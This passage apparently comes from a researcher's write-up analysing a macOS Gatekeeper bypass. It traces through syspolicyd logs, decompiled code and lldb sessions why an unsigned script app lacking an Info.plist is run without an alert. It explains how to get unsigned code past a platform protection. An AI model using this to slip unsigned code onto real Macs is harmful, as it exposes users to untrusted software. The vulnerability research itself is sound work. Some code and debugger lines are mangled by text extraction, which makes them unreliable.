[com.apple.syspolicy.exec:default] Updating flags:\n/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC, 512\n\n```\nThe log messages start out identical to both the normal and script-based applications. However, note that\nthe evaluation results come back different: ‚Äú GK evaluateScanResult: 2, PST: (path:\n```\n/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)),\n(bundle_id: NOT_A_BUNDLE), 1, 0, 1, 0, 7, 0 ‚Äù (Recall the other two applications returned with a\n\n```\n‚Äú GK evaluateScanResult: 0 ‚Äù).\n\nFollowing a evaluation result of 2 (versus a 0), no prompt-related log messages are shown ‚Ä¶\n```\nsyspolicyd just logs ‚Äú Updating flags:\n/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC, 512 ‚Äù and goes on its merry way\n\n```\n(allowing our PoC application to run uninhibited)!\n\nHooray! ‚Ä¶via log analysis we‚Äôve identified `syspolicyd as the OS-component that is both core to the`\napplication analysis and approval process and likely contains the flaw. Moreover, we‚Äôve pinpointed\ndivergent logic (that appears to skip any alerts and allows the application to run), based on a Gatekeeper\nscan result of a 2. #progress\n\n\n-----\n\nLet s now dive into a full reverse-engineering session combining static and dynamic analysis of\n```\nsyspolicyd in order to uncover exactly why our problematic proof of concept application is triggering\n\n```\nsuch a Gatekeeper scan result (a 2), and why this results in the alert/blocking logic being totally skipped!\n\n## Root Cause Analysis: To The Disassembler & Debugger!\n\nAnalysis of log messages revealed that `syspolicyd (as its name suggests) is the arbiter in determining`\nif an application should be allowed to run. Moreover divergent log messages indicated that our proof of\nconcept was perhaps triggering a logic flaw deep within `syspolicyd ‚Ä¶a flaw that would allow an`\nunsigned, unnotarized application to be run, when it clearly should be resoundingly blocked!\n\nFound in `/usr/libexec,` `syspolicyd is fairly compact binary, though its role is imperative to system`\nsecurity (for example, it is also involved in authorizing KEXTs). Luckily due to its rather copious logging,\nwe can quickly track down the code responsible for application assessments, which ultimately leads us to\nthe bug.\n\nRecall that when any script-based application is run (either the ‚Äúnormal‚Äù one that was blocked, or our\nfunky PoC that was allowed), a log message is generated indicating perhaps some (script-specific) code\npath . For example, for our `PoC.app,` `syspolicyd logs:` `Script evaluation:`\n```\n/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC, /bin/sh . This message appears to\n\n```\ncontain the full path of the item to evaluate (the script within our app), as well as the parent or responsible\nprocess (that is to say, who is about to run it). We find the code responsible for generating this log\nmessage within a unnamed subroutine in `syspolicyd :`\n```\n1if (os_log_type_enabled(rax, 0x1) != 0x0) {\n2  var_50 = 0x8400202;\n3  *(&var_50 + 0x4) = r13;\n4  *(int16_t *)(&var_50 + 0xc) = 0x840;\n5  *(&var_50 + 0xe) = r12;\n6  os_log_impl(__mh_execute_header, rbx, 0x1, \"Script evaluation: %@, %@\", &var_50, 0x16);\n7}\n\n```\nLet‚Äôs take a more comprehensive look at this subroutine, to understand its arguments, its logic, and how\nthe (script-based) assessment will continue. Below, is an abridged, cleaned-up, an annotated\ndecompilation of this subroutine:\n\n\n-----\n\n```\n  t sub_ 000 a068( t a g0, t a g, t a g, t a g3,\n 2          int arg4, int arg5, int arg6, int arg7) \n 3{\n 4 ...\n 5\n 6 //init process path from arg4\n 7 path = [NSString stringWithUTF8String:arg4];\n 8\n 9 //init responsible process path from arg6\n10 rpPath = [NSString stringWithUTF8String:arg6];\n11\n12 //init parent process path from arg5\n13 pPath = [NSString stringWithUTF8String:arg5];\n14\n15 //grab a 'globalManager'\n16 execManger = [ExecManagerService globalManager];\n17\n18 //log dbg msg\n19 if (os_log_type_enabled(rax, 0x1) != 0x0) {\n20   ...\n21   os_log_impl(__mh_execute_header, rbx, 0x1, \"Script evaluation: %@, %@\", &var_50, 0x16);\n22 }\n23\n24 //alloc/init ProcessTarget object w/ path to responsible process\n25 processTarget = [ProcessTarget alloc];\n26 rProcess = [processTarget initWithPath:rpPath withAuditToken:rcx];\n27\n28 //perform the evaluation\n29 [execManger gatekeeperEvaluationForUser:arg2 withPID:arg3 withProcessPath:path \n30  withParentProcessPath:pPath withResponsibleProcess:rProcess withLibraryPath:0x0 \n31  processIsScript:0x1 forEvaluationID:var_70];\n32\n33 ...\n34\n35 return;\n36}\n\n```\nVia static analysis of this subroutine (which takes eight arguments!), we can gain a fairly comprehensive\ninsight into its actions.\n\nFirst, it converts various arguments (that have been passed in a NULL-terminated ‚ÄòC‚Äô-strings) into\nObjective-C `NSString s. Then retrieves an` `ExecManagerService class‚Äôs` `globalManager . After`\nchecking if logging is enabled (and if so logging the aforementioned `\"Script evaluation\" message), it`\nallocates an instance of a `ProcessTarget class.`\n\nIt then initializes this `ProcessTarget object via a call to its` `initWithPath: withAuditToken method.`\nFinally the subroutine invokes the `ExecManagerService` `gatekeeperEvaluationForUser: withPID:`\n```\nwithProcessPath: withParentProcessPath: withResponsibleProcess: withLibraryPath:\nprocessIsScript: forEvaluationID: method.\n\n```\nThanks to the verbose method name, we can rather quickly determine the meaning of the arguments\npassed to the subroutine. For example, `withPID:arg3 implies the fourth argument ( arg3 ) is a pid of`\nthe process to evaluate. Also note that several values passed to the `gatekeeperEvaluationForUser:`\n```\nwithPID: ... method are hardcoded, most notably, processIsScript is set to 0x1 . This of course\n\n```\nmakes sense, as the evaluation is on a script-based application.\n\nThough we have a decent understanding of this subroutine (and its arguments), let‚Äôs double check our\nconclusions via a dynamic debugging session.\n\n\n-----\n\nIf one wants to debug Apple processes such as syspolicyd, System Integrity Protection (SIP), must be\ndisabled in some manner.\nInterestingly (and at this point I have no idea why), if one fully disables SIP, the bug will no longer\nmanifest!? That is to say, with SIP fully disabled, running the proof of concept application will result in an\nalert, identifying it as untrusted code from the Internet. Ironic!\n\nFor analysis reasons this is not ideal, as we‚Äôre trying to track down why (with SIP enabled) the unsigned\nPoC is allowed. The solution is to leave SIP mostly enabled, but simply allow debugging. This can\nachieved by executing `csrutil enable --without debug in Recovery Mode:`\n```\n% csrutil status\nSystem Integrity Protection status: unknown (Custom Configuration).\nConfiguration:\n Kext Signing: enabled\n Filesystem Protections: enabled\n Debugging Restrictions: disabled\n ...\nThis is an unsupported configuration, likely to break in the future and leave your machine in an\nunknown state.\n\n```\nNote that as macOS 11‚Äôs csrutil appears broken, one must side-install macOS 10.15. Then boot into its\nrecovery mode, run its csrutil to set the SIP flags. On Intel-based Macs this will be applied to any/all\ninstalled OS. Not so on M1 systems.\n\nOnce SIP has been configured to allow for the debugging of Apple processes, let‚Äôs attach to\n```\nsyspolicyd, set a breakpoint on the (unnamed) subroutine, then launch our quarantined PoC.app\n% !ps\nps aux | grep syspolicyd\nroot 138 /usr/libexec/syspolicyd\n% sudo lldb -p 138\n(lldb) process attach --pid 138\nProcess 138 stopped\n* thread #1, queue = 'com.apple.main-thread', stop reason = signal SIGSTOP\nExecutable module set to \"/usr/libexec/syspolicyd\".\nArchitecture set to: x86_64h-apple-macosx-.\n(lldb) image list\n[ 0] 818DB070-4938-3106-9784-559DA9C41D40 0x0000000100860000 /usr/libexec/syspolicyd \n\n```\nNote that the `syspolicyd image has been rebased to` `0x0000000100860000 (due to ASLR). Thus, we`\nsimilarly rebase our static analysis image in our disassembler (so that memory address match, etc.):\n\nRebasing syspolicyd\nNow, we set a breakpoint on the (unnamed) subroutine where the script evaluation begins:\n```\n(lldb) b 0x000000010088a068\nBreakpoint 1: where = syspolicyd`___lldb_unnamed_symbol611$$syspolicyd, address =\n0x000000010088a068\n\n```\nLaunching the proof of concept application, triggers the breakpoint, allowing us (amongst other things) to\nview the contents of the arguments. From our static analysis we determined that the third argument was\nthe user‚Äôs id, the fourth the pid of the process to evaluate, the fifth its path, the sixth the parent‚Äôs process\n\n\n-----\n\npath, etc etc. Let s view these now (noting arrangements in Intel x86_64 environments are passed in the\nfollowing order, `RDI,` `RSI,` `RDX,` `RCX,` `R8,` `R9, and then on the stack):`\n```\n(lldb) p (int)$rdx\n(int) $24 = 501\n(lldb) p (int)$rcx\n(int) $25 = 27038\n(lldb) x/s $r8\n0x70001018c6f8: \"/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC\"\n(lldb) x/s $r9\n0x70001018c734: \"/bin/sh\"\n\n```\nEverything matches what we expect, though let‚Äôs confirm the fourth argument (the pid, in `RCX ) with a`\nvalue of 27038 is indeed the pid of process set to be evaluated:\n```\n% ps -p 27038\nPID  CMD\n27038 /bin/sh /private/var/folders/pw/sv96s36d0qgc_6jh45jqmrmr0000gn/T/AppTranslocation/743C3DB664D7-41B3-9040-D46B74E5296F/d/PoC.app/Contents/MacOS/PoC\n\n```\nTurns out that `27038 is an instance of a the shell ( /bin/sh ) set to run our proof of concept script:`\n```\nPoC.app/Contents/MacOS/PoC . This makes sense, as scripts (unlike say a compiled mach-O binary) of\n\n```\ncourse can not be run natively. They need an interpreter process, such as `/bin/sh .`\n\nIt‚Äôs worth reiterating that the process ( 27038 : `/bin/sh ) though created is held in a suspended state`\nuntil the evaluation has completed. (And if the system finds it violates a policy such as being unnotarized\nor running a quarantined script from an unnotarized bundle, it is killed without ever having been run ‚Ä¶\nunless of course there is a vulnerability!).\n\nAlso, note the ‚Äústrange‚Äù path to our script-based PoC application. Known as App Translocation, this\nsecurity mechanism transparently relocates (copies) any downloaded (i.e. quarantined) content the first\ntime it is launched by the user. This action is to mitigate a Gatekeeper bypass I discovered in 2016, that\nleveraged dylib hijacking in order to allow unsigned code to run. Though the vulnerability discussed in this\npost is not related to App Translocation, it‚Äôs important to at least understand why the location of our PoC\nhas changed.\n\nOk onwards! Let‚Äôs continue on with our debugging, stopping at the call to the\n```\ngatekeeperEvaluationForUser: withPID: method to examine the arguments.\n\n```\n\n-----\n\n```\n( db) ocess 38 stopped\nsyspolicyd`___lldb_unnamed_symbol611$$syspolicyd:\n-> 0x10088a223 : callq *%rax\n(lldb) po $rdi\n<ExecManagerService: 0x7fdb5e733150>\n(lldb) po [$rdi className]\nExecManagerService\n(lldb) x/s $rsi\n0x7fff7e1df01d:\n\"gatekeeperEvaluationForUser:withPID:withProcessPath:withParentProcessPath:withResponsibleProcess:\n(lldb) p (int)$rdx\n(int) $34 = 501\n(lldb) p (int)$rcx\n(int) $35 = 27038\n(lldb) po $r8\n/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC\n(lldb) po $r9\n/bin/sh\n(lldb) x/gx $rsp\n0x70001018c570: 0x00007fdb6312cf20\n(lldb) po 0x00007fdb6312cf20\n\n```\nFirst we print out the object in the first argument, which is the Objective-C object upon which the method is\nbeing invoked. It‚Äôs the `globalManager (class:` `ExecManagerService ) created by the subroutine. The`\nsecond argument holds the method name, `gatekeeperEvaluationForUser:withPID: ... . The`\nremaining arguments include the user id ( uid ), the pid of the (suspended) process, the path to the item\nto evaluate (our PoC script-based app), path of the parent process, then an instance of a\n```\nProcessTarget class, which represents the responsible process. This argument is passed via the stack\n\n```\n(as all the registers that are used for a method call have already been used). Specifically it can be found\nat $rsp + 0x0, with a value of `0x00007fdb6312cf20 . This is a pointer to an Objective-C`\n( ProcessTarget ) object, meaning we can introspect it, including accessing its pid and path:\n```\n(lldb) p (int)[0x00007fdb6312cf20 pid]\n(int) $51 = 27038\n(lldb) po [0x00007fdb6312cf20 path]\n/bin/sh\n\n```\nTurns out this responsible process, is also the parent process ( /bin/sh, pid `27038 ).`\n\nSo far nothing too surprising or strange. We‚Äôve simply confirmed the fact that the `syspolicyd daemon is`\nabout to evaluate our script-based PoC app, as it‚Äôs executed via the shell ( /bin/sh ).\n\n\n-----\n\nLet s now turn our attention to the `gatekeeperEvaluationForUser:withPID:withProcessPath:`\nmethod. A brief triage of a decompilation of this method, reveals it simply makes a `dispatch_async call,`\nto execute a block, allowing a background queue to asynchronously perform the evaluation. The block\ninvokes the `ExecManagerPolicy ‚Äôs`\n```\nevaluateCodeForUser:withPID:withProcessPath:withParentProcessPath:withResponsibleProcess:\nwithLibraryPath:processIsScript:withCompletionCallback: method. It passes along the\n\n```\narguments we‚Äôve already described (along with a callback block that will be invoked once the evaluation\nhas completed).\n\nThis method first allocates an object of `EvaluationResult and set its` `allowed instance variable to`\nfalse (0x0):\n```\n1evalReesult = objc_alloc_init(@class(EvaluationResult));\n2[evalReesult setAllowed:0x0];\n\n```\n‚Ä¶wise, explicitly default any evaluation to not allowed.\n\nIt then prints out a log message we saw earlier: `GK process assessment:`\n```\n/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC <-- (/bin/sh, /bin/sh)\n\n```\nBy analyzing the values passed to the log message‚Äôs format string, `GK process assessment: %@ <--`\n```\n(%@, %@), we know this message prints out the process (or script) to evaluate, along with its parent and\n\n```\nresponsible processes (which in this case are the same, `/bin/sh ).`\n\nAfter checking that the process (or script) to evaluate is an accessible file, the code invokes an unnamed\nsubroutine which takes the path to the evaluatee (e.g. `PoC.app/Contents/MacOS/PoC ), and returns a`\nboolean value. More on this later, but this value is then stored in an instance variable named `isBundle,`\nso safe to assume it contains logic related to determining if an item falls within an (application?) bundle ‚Ä¶\nü§î\n\nNext the method allocates an object of type `PolicyScanTarget and initializes it with the path of the item`\nto evaluate (e.g. `PoC.app/Contents/MacOS/PoC ). It then sets various instance variables in this newly`\nallocated object:\n```\n1policyScanTarget = [[PolicyScanTarget alloc] initWithURL:evaluatee];\n2\n3[policyScanTarget setTriggeredByLibraryLoad:var_51];\n4[policyScanTarget setIsScript:sign_extend_64(var_24)];\n5[policyScanTarget setIsBundled:var_6C & 0xff];\n6[policyScanTarget setPid:var_98];\n\n```\nRecall that (several method calls back), `gatekeeperEvaluationForUser was invoked with`\n```\nwithLibraryPath:0x0 and processIsScript:0x1 . These (hardcoded) values were passed in as\n\n```\nparameters and are passed to the `PolicyScanTarget ‚Äôs object‚Äôs` `setTriggeredByLibraryLoad and`\n```\nsetIsScript setter methods. Similarly, the setPid method is invoked with the passed in process id.\n\n```\nThe `setIsBundled is notable, as its parameter ( var_6C ), is a boolean, returned from the`\naforementioned unnamed subroutine that was called a few instructions earlier.\n\nIn a debugger, once we‚Äôve stepped over the `PolicyScanTarget method, we can print it out. Specifically`\nwe can invoke any of its accessor methods to reveal the contents of initialized instance variables. And\nhow do we know the names of these accessor methods? The easiest way is simply via the disassembler\n(which can parse Objective-C objects and extract this information):\n\n\n-----\n\nPolicyScanTarget's\n\nmethods\nSo for example we confirm the facts that the ‚Äúurl‚Äù points to our PoC script, the `isScript is set to true`\n(0x1), and also introspect the value of the `isBundled instance variable. Note that in the debugger output`\nthe address `0x00007fdb5e706a40 is the` `PolicyScanTarget object:`\n\n\n-----\n\n```\n( db) po [0 0000 db5e 06a 0 c ass a e]\nPolicyScanTarget\n(lldb) po [0x00007fdb5e706a40 url]\nfile:///Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC\n(lldb) p (BOOL)[0x00007fdb5e706a40 isScript]\n(BOOL) $73 = YES\n(lldb) p (BOOL)[0x00007fdb5e706a40 triggeredByLibraryLoad]\n(BOOL) $74 = NO\n(lldb) p (BOOL)[0x00007fdb5e706a40 isBundled]\n(BOOL) $72 = NO\n\n```\nThe `evaluateCodeForUser:withPID: ... method then creates another` `PolicyScanTarget, this`\ntime for the parent process, though it‚Äôs solely initialized with the parent processes path (e.g. `/bin/sh ) ‚Ä¶`\nno other instance variables are initialized.\n\nFinally the `EvaluationManager ‚Äôs` `evaluateTarget: withParentTarget: withResponsibleProcess:`\n```\nforUser: onCompletion: is invoked. The evaluateTarget is set to the PolicyScanTarget object\n\n```\nfor our evaluee, while the `withParentTarget is set to the` `PolicyScanTarget object that was created`\nfor the parent process. The other parameters are simply set to values passed into the\n```\nevaluateCodeForUser:withPID: ... method.\n(lldb) Process 138 stopped\n* thread #30, queue = 'syspolicy.executions.evaluations', stop reason = instruction step over\n  frame #0: 0x000000010087cab0 syspolicyd`___lldb_unnamed_symbol447$$syspolicyd + 1854\nsyspolicyd`___lldb_unnamed_symbol447$$syspolicyd:\n-> 0x10087cab0 : callq *0x838ea(%rip)      ; (void *)0x00007fff20298d00: objc_msgSend\n  0x10087cab6 : movq  0x838eb(%rip), %r13    ; (void *)0x00007fff2029a9a0: objc_release\n  0x10087cabd : movq  %r14, %rdi\n  0x10087cac0 : callq *%r13\nTarget 0: (syspolicyd) stopped.\n(lldb) po $rdi\n<EvaluationManager: 0x7fdb5e40d0c0:>\n(lldb) x/s $rsi\n0x7fff7e1dde2b: \"evaluateTarget:withParentTarget:withResponsibleProcess:forUser:onCompletion:\"\n(lldb) po $rdx\nPST: (path: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)),\n(bundle_id: (null))\n(lldb) po $rcx\nPST: (path: /bin/sh), (team: (null)), (id: (null)), (bundle_id: (null))\n\n```\nThe `evaluateTarget: withParentTarget: ... method calls down into various methods which`\neventually invokes the `EvaluationManager ‚Äôs` `scanTarget:onCompletion: method. This method`\nqueues up a scan, via a block that calls into the `EvaluationManager s` `performScan:`\n```\nwithProgressHandler: withCodeEvaluation:\n\n```\nThe `performScan: withProgressHandler: withCodeEvaluation: is important as it (finally!) calls into`\nthe policy engine ( PolicyScanner ) scan methods (such as `scanTarget: ... method), but more`\nimportantly contains the `GK scan complete: log message. This indicates that the evaluation is finally`\n\n\n-----\n\ncomplete!\n\nReady to dive into the internals of the policy engine? Yah, me neither ‚Ä¶and turns out we don‚Äôt have to!\n\nFrom our initial log spelunking (between a normal application, a normal script-based application, and our\nPoC), recall that the only (main) difference was in a single value found within the `GK`\n\n`evaluateScanResult:` message. For the applications that triggered an alert this value was a 0, while for\nour PoC (that generated no alerts and was incorrectly allowed to run), it was a 2. All other policy related\nlog message (e.g. notarization checks, etc) were the same.\n\nAt this point during my analysis, with a thorough understanding of at least the evaluation setup (and\nrelevant classes such as `EvaluationManager,` `PolicyScanTarget and` `EvaluationResult ), I`\ndecided to skip diving into the internals of the policy engine and instead work backwards from the `GK`\n\n`evaluateScanResult:` message. The idea was to see if I could figure out why the proof of concept\napplication was assigned a 2 ‚Ä¶as this seemed to be the only differentiator, and perhaps why it was\nallowed (vs. blocked).\n\nThe `GK evaluateScanResult:` message in the `EvaluationManager ‚Äôs is logged in the aptly named`\n```\nevaluateScanResult: withEvaluationArguments: withPolicy: withEvaluationType:\nwithCodeEval: method.\n\n```\nSetting a breakpoint here, we can see it‚Äôs invoked after an evaluation has completed, and contains the\nresults of the scan, scan arguments (which includes the `PolicyScanner object of the evaluee ‚Ä¶our`\nPoC script), and an evaluation type:\n\n\n-----\n\n```\n( db) c\nProcess 138 resuming\nProcess 138 stopped\n* thread #44, queue = 'syspolicyd.evaluations.completion', stop reason = breakpoint 8.1\n  frame #0: 0x00000001008af4ca syspolicyd`___lldb_unnamed_symbol1234$$syspolicyd\n(lldb) po $rdi\n<EvaluationManager: 0x7fdb5e40d0c0>\n(lldb) x/s $rsi\n0x7fff7e1e025e:\n\"evaluateScanResult:withEvaluationArguments:withPolicy:withEvaluationType:withCodeEval:\"\n(lldb) po [$rdx className]\nScanResult\n(lldb) po $rdx\nScanResult: 1,0,0,0 - 0,7,0x0\n(lldb) po [$rcx className]\nEvaluationArguments\n(lldb) po $rcx\nEvalArgs: PST: (path: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id:\n(null)), (bundle_id: NOT_A_BUNDLE), PST: (path: /bin/sh), (team: (null)), (id: (null)),\n(bundle_id: (null)), <ProcessTarget: 0x7fdb60c8ce60>, 501, 0, 1\n(lldb) po $r8\n<nil>\n(lldb) po $r9\n2\n\n```\nNow recall an example of the `GK evaluateScanResult: ... log message:`\n```\nGK evaluateScanResult: 2, PST: (path: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC),\n(team: (null)), (id: (null)), (bundle_id: NOT_A_BUNDLE), 1, 0, 1, 0, 7, 0 \n\n```\nLooking at the code that prints out this message, provides valuable insight into the components of the\nmessage:\n\n\n-----\n\n```\n   (os_ og_type_e ab ed( a, 0 0) 0 0) {\n 2 var_B0 = [var_A0 isQuarantined];\n 3 var_B8 = [var_A0 isUserApproved];\n 4 var_F0 = [r13 success];\n 5 rbx = [r13 isBypass];\n 6 r14 = [r13 policyMatch];\n 7 rax = [r13 xpResult];\n 8 var_70 = 0x8000802;\n 9 *(&var_70 + 0x4) = var_D8;\n10 *(int16_t *)(&var_70 + 0xc) = 0x840;\n11 *(&var_70 + 0xe) = var_A0;\n12 *(int16_t *)(&var_70 + 0x16) = 0x400;\n13 *(int32_t *)(&var_70 + 0x18) = sign_extend_64(var_B0);\n14 *(int16_t *)(&var_70 + 0x1c) = 0x400;\n15 *(int32_t *)(&var_70 + 0x1e) = sign_extend_64(var_B8);\n16 *(int16_t *)(&var_70 + 0x22) = 0x400;\n17 *(int32_t *)(&var_70 + 0x24) = sign_extend_64(var_F0);\n18 *(int16_t *)(&var_70 + 0x28) = 0x400;\n19 *(int32_t *)(&var_70 + 0x2a) = sign_extend_64(rbx);\n20 *(int16_t *)(&var_70 + 0x2e) = 0x800;\n21 *(&var_70 + 0x30) = r14;\n22 *(int16_t *)(&var_70 + 0x38) = 0x400;\n23 *(int32_t *)(&var_70 + 0x3a) = rax;\n24 rax = os_log_impl(__mh_execute_header, r15, 0x0, \"GK evaluateScanResult: %lu, %@, %d, %d, %d,\n%d, %lu, %d\", &var_70, 0x3e);\n25}\n\n```\nFrom this, we can see the format string, `%lu, %@, %d, %d, %d, %d, %lu, %d, will be populated with`\nvalues such as a `PolicyScanTarget (that was initialized to represent the evaluee, our PoC), whether`\nthe evaluee was quarantined (it was), was user approved (it was not), whether the evaluation completed\nsuccessfully (it did), whether the evaluee was afforded a bypass (it was not), the results of an XProtect\nclassification (7, unsigned code), and if it matched a policy (it did not).\n\nAgain to reiterate, the values in the log message (as a result of evaluating our allowed PoC) except for the\nfirst, exactly matched a log message when scanning the normal script-based application, `Script.app`\nwhich was blocked. So this implies they are likely irrelevant, or spurious in terms of tracking down the\nunderlying reason why our unsigned, quarantined PoC was allowed.\n\nSo, what‚Äôs the first value printed out (2 in the case of evaluating our PoC, 0 for the other application that\nwere ultimated blocked). Turns out it was passed in to the `evaluateScanResult: method as the value`\nfor the `withEvaluationType: parameter (arg5, in` `R9 ):`\n```\n(lldb) po $r9\n2\n\n```\nThus we (now) know it represents an ‚Äúevaluation type‚Äù.\n\nBefore we see how this value, the evaluation type, influences control flow and ultimately determines\nwhether or not the evaluee should be allowed, let‚Äôs keep working backwards to see where it came from,\nand why it‚Äôs set to 0x2 (vs. 0x0).\n\nAn unnamed subroutine is responsible for calling the `evaluateScanResult: ...`\n```\nwithEvaluationType: method. It invokes this method with the return value from a EvaluationPolicy\n\n```\nmethod called `determineGatekeeperEvaluationTypeForTarget :`\n\n\n-----\n\n```\n2 type = [r15 determineGatekeeperEvaluationTypeForTarget:r12 withResponsibleTarget:rax];\n3\n4 ...\n5\n6 [[rdi evaluateScanResult:rdx withEvaluationArguments:rcx withPolicy:r8 withEvaluationType:type\n...];\n\n```\nThe `determineGatekeeperEvaluationTypeForTarget: method is invoked with the`\n```\nPolicyScanTarget object representing our evaluee and a ProcessTarget representing the\n\n```\nresponsible process (e.g. `/bin/sh ).`\n\nThe method contains various checks upon the item represented in the `PolicyScanTarget object. For`\nexample it first checks if the item is quarantined. If not, it simply returns. Obviously non-quarantined items\ncan safely be allowed.\n```\n1 rax = [policyScanTarget isQuarantined];\n2 ...\n3\n4 r15 = 0x2;\n5 if (rax == 0x0) goto leave;\n6\n7leave:\n8 rax = r15;\n9 return rax;\n\n```\nInterestingly the return value is also 0x2. However, we know that our PoC was quarantined (and in a\ndebugger, we can confirm this code path is not taken). So, onwards!\n\nHowever, we then come across the following logic:\n```\n 1 if ([policyScanTarget isUserApproved] == 0x0)\n 2 {\n 3  if ([policyScanTarget isScript] == 0x0) goto continue;\n 4  \n 5  r15 = 0x2;\n 6  if ([policyScanTarget isBundled] == 0x0) goto leave;\n 7\n 8 }\n 9\n10 ...\n11\n12leave:\n13 rax = r15;\n14 return rax;\n\n```\nThis logic first checks if the `PolicyScanTarget object representing our PoC has been user approved.`\nAs it has not, we enter the `if statement. It then checks and exits the` `if statement if the item is not a`\nscript. Since our PoC is a script, the `isScript method returns a non-zero value, and thus execution`\ncontinues with a call to `isBundled .`\n\n\n-----\n\n```\n( db)\nProcess 138 stopped\n-> 0x1008b78b2 : callq *0x48ae8(%rip)      ; objc_msgSend\n(lldb) po $rdi\nPST: (path: /Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC), (team: (null)), (id: (null)),\n(bundle_id: NOT_A_BUNDLE)\n(lldb) x/s $rsi\n0x7fff7e1e046e: \"isBundled\"\n(lldb) p (BOOL)[$rdi isBundled]\n(BOOL) $1 = NO\n\n```\nThe `isBundled simply returns the value of the` `bundled instance variable of the` `PolicyScanTarget`\nobject. As it is not set `isBundled returns zero, which (as shown above, well, and below) causes the`\n```\ndetermineGatekeeperEvaluationTypeForTarget: method to leave, returning with a 0x2:\n1 r15 = 0x2;\n2 if ([policyScanTarget isBundled] == 0x0) goto leave;\n3\n4leave:\n5 rax = r15;\n6 return rax;\n\n```\n‚Ä¶as we saw an 0x2 was (also) returned for non-quarantined items (which are then allowed) ‚Ä¶this seems\nproblematic!\n\nLet‚Äôs also run the normal script-based application ( Script.app, which we know gets blocked) and see\nthat in its case `isBundled returns true, as shown in the debugger output below:`\n```\n(lldb) \nProcess 138 stopped\n-> 0x1008b78b2 : callq *0x48ae8(%rip)      ; objc_msgSend\n(lldb) po $rdi\nPST: (path: /Users/patrick/Downloads/Script.app), (team: (null)), (id: (null)), (bundle_id:\nScript)\n(lldb) x/s $rsi\n0x7fff7e1e046e: \"isBundled\"\n(lldb) p (BOOL)[$rdi isBundled]\n(BOOL) $117 = YES\n\n```\n‚Ä¶and thus for `Script.app, the` `determineGatekeeperEvaluationTypeForTarget: eventually`\nreturns an evaluation type of `0x0 .`\n\nHooray, we‚Äôve now identified a problematic difference in macOS‚Äôs evaluation logic between our PoC\n(which is allowed), and a normal script-based application (which is blocked). The fact that macOS does\nnot think our PoC is ‚Äúbundled‚Äù (and returns a 0x2 for the evaluation type) is clearly a flaw. But why does it\nthink that!?\n\nRecall that earlier we noted the `bundled instance variable was set via the following code (from`\n```\nExecManagerPolicy ‚Äôs evaluateCodeForUser:withPID: ... method):\n\n```\n\n-----\n\n```\n  a sub_ 008 606c( b, 0 0);\n 2if (rax != 0x0) {\n 3  var_6C = 0x1;\n 4}\n 5else {\n 6  ...\n 7  var_6C = 0x0;\n 8}\n 9\n10[policyScanTarget setIsBundled:var_6C & 0xff];\n\n```\nThus it appears the unnamed subroutine is the culprit! We noted earlier that the subroutine is invoked with\na path to the item to classify (as a bundle or not). As it‚Äôs evaluating our PoC, this path will be\n```\n/Users/patrick/Downloads/PoC.app/Contents/MacOS/PoC . Recall (and this proves to be important),\n\n```\nour `PoC.app is a bare-boned application that does not contain an` `Info.plist file!`\n\nThe subroutine‚Äôs first check is to see if the path contains a @\".\". If not, it simply returns 0.\n```\n1if ([rax containsString:@\".\"] == 0x0) goto leave;\n2\n3leave:\n4 var_B8 = 0x0;\n5 rax = [var_B8 autorelease];\n6 return rax;\n\n```\nThis makes sense, a (application) bundle will have to have a folder named something like `foo.app .`\n\nNext it splits the path into its components, which when analyzing our PoC application, will produce the\nfollowing:\n```\n(lldb) po $rax\n<__nsarraym>(\n/,\nUsers,\npatrick,\nDownloads,\nPoC.app,\nContents,\nMacOS,\nPoC\n)\n\n```\nIf there are no path components, it returns with 0x0. So far (still), so good.\n\nIt then iterates over each path component, invoking the `pathExtension upon it, and checking the result.`\nFor any ‚Äúnon-bundle‚Äù directories (that have no path components), it will just move on to the next. Once it\ncomes across the bundle directory (e.g. `PoC.app ) the` `pathExtension will return a non-nil value (e.g.`\n```\napp ). The code continues then by splitting the (original) path again into components again, and creating\n\n```\narray with only those components up and to an including the bundle directory:\n\n\n-----\n\n```\n( db) po $ a\n<__nsarrayi_transfer>(\n/,\nUsers,\npatrick,\nDownloads,\nPoC.app\n)\n\n```\nThis is then joined back into a single path (e.g. `/Users/patrick/Downloads/PoC.app/ ).`\n\nThe code then calls into another subroutine, passing in potential (relative) locations for an `Info.plist`\nfile. For example `Contents/Info.plist,` `Versions/Current/Resources/Info.plist, or`\n```\nInfo.plist :\n1if ( ((sub_100015829(rbx, @\"Contents/Info.plist\") != 0x0) || \n2   (sub_100015829(rbx, @\"Versions/Current/Resources/Info.plist\") != 0x0)) || \n3   (sub_100015829(rbx, @\"Info.plist\") != 0x0)) goto isBundle;\n\n```\nThis helper subroutine simply attempts to open such candidate files, and if found, checks for various keys\n(commonly found or required in an `Info.plist file) such as` `CFBundleIdentifier, or`\n```\nCFBundleExecutable .\n\n```\nAs our bare-bones `PoC.app does not contain an` `Info.plist file, the code continues‚Ä¶`\n\nNext it checks if the item is an ‚Äúapplication wrapper‚Äù, by invoking the `AppWrapper class‚Äôs`\n```\nisAppWrapper: method. This begins by appending the string Wrapper to the (potential) bundle\n\n```\ndirectory. For our PoC this will be `/Users/patrick/Downloads/PoC.app/Wrapper ‚Ä¶it then checks if`\nthat file exists (which in the case of our `PoC it does not).`\n\nAs the `isAppWrapper: method returns 0 (false), the code continues processing the remaining path`\ncomponents ( Contents, `MacOS,` `PoC ), seeing if any have a path extension, and if so, have a`\ncandidate `Info.plist file or is an ‚ÄúApp Wrapper‚Äù. As none do, the subroutine returns 0 (false), as`\naccording to it‚Äôs logic, our `PoC.app (which does not have an` `Info.plist file) is not a bundle. Oops! ÔøΩ`\n\nNo bundle means `isBundle is set to 0x0 (false), which means that the`\n```\ndetermineGatekeeperEvaluationTypeForTarget method returns with an 0x2! (vs. a 0x0).\n\n```\nLet‚Äôs wrap this all up by looking at what it means if evaluation type of 0x2 is returned and then passed 